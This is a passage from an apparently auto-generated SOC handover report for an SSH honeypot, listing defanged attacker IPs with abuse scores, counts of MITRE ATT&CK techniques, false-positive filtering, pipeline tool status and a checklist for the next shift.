| `14.1.106[.]167` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 0 |
| `172.92.187[.]68` | US | Wave Broadband | **100** ⚠️ | 9 |
| `103.147.248[.]44` | IN | Softcrop It | **100** ⚠️ | 50 |
| `116.7.248[.]50` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `206.189.80[.]102` | SG | DigitalOcean, LLC | **100** ⚠️ | 48 |
| `65.20.204[.]88` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `102.211.7[.]162` | LY | LibyanElite | **100** ⚠️ | 24 |
| `217.148.142[.]100` | US | M247 LTD New York Infrastructure | **100** ⚠️ | 14 |
| `101.13.4[.]128` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 34 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 36 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 25 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 84 cases |
| Tool 34  | Credential Extractor        | ✅ 35 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (4.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 29 recon entry/entries in table (2 group(s) consolidating 43 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-28T10:30:24Z_
